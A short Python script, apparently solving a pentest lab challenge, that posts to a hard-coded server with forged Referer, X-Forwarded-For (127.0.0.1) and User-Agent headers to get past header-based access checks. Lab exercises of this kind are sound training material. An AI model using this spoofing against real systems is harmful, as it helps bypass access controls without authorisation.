import requests
url = "http://115.28.78.16:13333/pentest/02/"
header = {"Referer":"www.google.com",\
          "X-Forwarded-For":"127.0.0.1",\
          "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 99_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/99.0 Mobile/10A403 Safari/8536.25"
}
re = requests.post(url,headers=header)
print(re.headers)